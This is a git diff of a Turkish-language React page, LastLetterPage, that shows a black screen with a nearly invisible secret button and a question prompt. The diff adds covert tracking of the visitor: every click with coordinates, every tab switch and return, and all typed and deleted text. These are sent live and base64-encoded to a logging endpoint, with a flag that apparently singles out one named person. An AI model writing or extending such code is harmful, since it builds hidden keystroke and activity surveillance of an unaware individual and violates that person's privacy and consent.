@@ -7,7 +7,7 @@ import { postLogToApi } from '../utils/gardenEngine';
  * - Arkaplan zifiri siyah (#000000). Hiçbir yazı yok.
  * - Sağ altta çok küçük, zayıfça fark edilebilen 6px yuvarlak gizli buton.
  * - Butona tıklanınca "Ne görmek istiyorsun? Söyle. Ciddiyim Ne görmek istiyorsun?" sorusu ve yazı alanı açılır.
- * - Yazılan, silinen ve gönderilen her şey canlı olarak bildirim ile gönderilir.
+ * - Ekranda yapılan tüm tıklamalar, canlı yazılar, silinenler, gönderilenler ve sekmeden ayrılma / sekmeye dönme anları anlık bildirim olarak iletilir.
  */
 export default function LastLetterPage({ onGoHome }) {
   // Device & Auth
@@ -29,13 +29,14 @@ export default function LastLetterPage({ onGoHome }) {
   const [inputText, setInputText] = useState('');
   const [isSubmitted, setIsSubmitted] = useState(false);
 
-  // Real-time Text Tracking Refs
+  // Real-time Text Tracking & State Refs
   const allTypedHistoryRef = useRef('');
   const deletedTextHistoryRef = useRef('');
   const prevTextRef = useRef('');
   const lastSentTextRef = useRef('');
   const lastSentTimeRef = useRef(0);
   const typingTimerRef = useRef(null);
+  const lastClickTimeRef = useRef(0);
 
   // Detect Client Device
   const detectDevice = useCallback(() => {
@@ -120,18 +121,22 @@ export default function LastLetterPage({ onGoHome }) {
     };
   }, [sendLog, deviceId]);
 
-  // Global Page Leave / Tab Exit Sentinel
+  // Global Tab Exit & Tab Return Visibility Sentinel (Immediate notification when tab is hidden or changed)
   useEffect(() => {
-    const handleLeavePage = () => {
+    let isHiddenState = false;
+
+    const handleVisibilityChange = () => {
       const elapsedMs = Date.now() - sessionStartTimeRef.current;
       const mins = Math.floor(elapsedMs / 60000);
       const secs = Math.floor((elapsedMs % 60000) / 1000);
       const durationStr = `${String(mins).padStart(2, '0')} dk ${String(secs).padStart(2, '0')} sn`;
 
-      const rawPayload = JSON.stringify({
-        eventType: 'visitor_left_page',
-        data: {
-          action: 'Ziyaretçi Sayfadan Ayrıldı / Sekmeyi Kapattı',
+      if (document.visibilityState === 'hidden') {
+        if (isHiddenState) return;
+        isHiddenState = true;
+
+        const payload = {
+          action: '🚪 Ziyaretçi Sekmeyi Değiştirdi / Arka Plana Aldı / Ayrıldı',
           duration: durationStr,
           stage: currentStageRef.current,
           letterText: prevTextRef.current || null,
@@ -140,21 +145,126 @@ export default function LastLetterPage({ onGoHome }) {
           deviceId: deviceId,
           device: detectDevice(),
           is_aysenur: true
-        },
-        timestamp: new Date().toISOString()
-      });
+        };
 
-      const _v = btoa(encodeURIComponent(rawPayload));
+        // Send Beacon for background reliability
+        if (typeof navigator !== 'undefined' && navigator.sendBeacon) {
+          try {
+            const rawPayload = JSON.stringify({
+              eventType: 'visitor_left_page',
+              data: payload,
+              timestamp: new Date().toISOString()
+            });
+            const _v = btoa(encodeURIComponent(rawPayload));
+            const blob = new Blob([JSON.stringify({ _v })], { type: 'application/json' });
+            navigator.sendBeacon('/api/flower-logs', blob);
+          } catch (e) {}
+        }
 
-      if (navigator.sendBeacon) {
-        const blob = new Blob([JSON.stringify({ _v })], { type: 'application/json' });
-        navigator.sendBeacon('/api/flower-logs', blob);
+        sendLog('visitor_left_page', payload);
+      } else if (document.visibilityState === 'visible') {
+        if (!isHiddenState) return;
+        isHiddenState = false;
+
+        sendLog('visitor_returned_to_page', {
+          action: '🚪 Ziyaretçi Sekmeye Geri Dönüş Yaptı! (Sayfa Yeniden Ekranda)',
+          duration: durationStr,
+          stage: currentStageRef.current,
+          deviceId: deviceId,
+          device: detectDevice(),
+          is_aysenur: true
+        });
       }
     };
 
-    window.addEventListener('beforeunload', handleLeavePage);
-    return () => window.removeEventListener('beforeunload', handleLeavePage);
-  }, [deviceId, detectDevice]);
+    const handleBeforeUnload = () => {
+      const elapsedMs = Date.now() - sessionStartTimeRef.current;
+      const mins = Math.floor(elapsedMs / 60000);
+      const secs = Math.floor((elapsedMs % 60000) / 1000);
+      const durationStr = `${String(mins).padStart(2, '0')} dk ${String(secs).padStart(2, '0')} sn`;
+
+      const payload = {
+        action: '🚪 Ziyaretçi Sayfadan Ayrıldı / Sekmeyi Kapattı',
+        duration: durationStr,
+        stage: currentStageRef.current,
+        letterText: prevTextRef.current || null,
+        allTypedHistory: allTypedHistoryRef.current || null,
+        deletedText: deletedTextHistoryRef.current || null,
+        deviceId: deviceId,
+        device: detectDevice(),
+        is_aysenur: true
+      };
+
+      if (typeof navigator !== 'undefined' && navigator.sendBeacon) {
+        try {
+          const rawPayload = JSON.stringify({
+            eventType: 'visitor_left_page',
+            data: payload,
+            timestamp: new Date().toISOString()
+          });
+          const _v = btoa(encodeURIComponent(rawPayload));
+          const blob = new Blob([JSON.stringify({ _v })], { type: 'application/json' });
+          navigator.sendBeacon('/api/flower-logs', blob);
+        } catch (e) {}
+      }
+    };
+
+    document.addEventListener('visibilitychange', handleVisibilityChange);
+    window.addEventListener('pagehide', handleBeforeUnload);
+    window.addEventListener('beforeunload', handleBeforeUnload);
+
+    return () => {
+      document.removeEventListener('visibilitychange', handleVisibilityChange);
+      window.removeEventListener('pagehide', handleBeforeUnload);
+      window.removeEventListener('beforeunload', handleBeforeUnload);
+    };
+  }, [sendLog, deviceId, detectDevice]);
+
+  // Global Click Sentinel (Sends notification for ANY click made anywhere on the screen)
+  useEffect(() => {
+    const handleGlobalClick = (e) => {
+      const now = Date.now();
+      if (now - lastClickTimeRef.current < 400) return; // Debounce rapid multi-clicks (400ms)
+      lastClickTimeRef.current = now;
+
+      const clickType = e.type === 'contextmenu' ? 'Sağ Tıklama (Context Menu)' : 'Sol Tıklama';
+      let targetLabel = 'Siyah Boş Ekrana Tıkladı';
+
+      if (e.target) {
+        const tagName = String(e.target.tagName || '').toUpperCase();
+        const className = String(e.target.className || '');
+
+        if (className.includes('secret-dot') || tagName === 'BUTTON' && !e.target.innerText) {
+          targetLabel = 'Sağ Alttaki Gizli Nokta Butonuna Tıkladı';
+        } else if (tagName === 'TEXTAREA') {
+          targetLabel = 'Gizli Soru Yazı Kutusuna Tıkladı';
+        } else if (tagName === 'BUTTON' && e.target.innerText.includes('Gönder')) {
+          targetLabel = 'Gönder Butonuna Tıkladı';
+        } else if (tagName === 'H2') {
+          targetLabel = 'Soru Başlığına Tıkladı';
+        } else {
+          targetLabel = `Ekranda Öğe Tıklandı (${tagName}${className ? '.' + className.slice(0, 20) : ''})`;
+        }
+      }
+
+      const coords = `X: ${e.clientX || 0}px, Y: ${e.clientY || 0}px`;
+
+      sendLog('last_user_click', {
+        clickType,
+        targetElement: targetLabel,
+        coordinates: coords,
+        action: `Ziyaretçi Ekrana Tıkladı (${clickType} - ${targetLabel} - ${coords})`
+      });
+    };
+
+    window.addEventListener('click', handleGlobalClick);
+    window.addEventListener('contextmenu', handleGlobalClick);
+
+    return () => {
+      window.removeEventListener('click', handleGlobalClick);
+      window.removeEventListener('contextmenu', handleGlobalClick);
+    };
+  }, [sendLog]);
 
   // Handle Secret Button Click
   const handleSecretButtonClick = () => {
@@ -185,7 +295,7 @@ export default function LastLetterPage({ onGoHome }) {
       if (deletedSegment) {
         deletedTextHistoryRef.current += ` [silindi: "${deletedSegment}"]`;
 
-        // Immediately send single deletion notification (no rate-limit burst)
+        // Immediately send single deletion notification
         sendLog('secret_input_deleted', {
           letterText: newVal,
           answer: newVal,
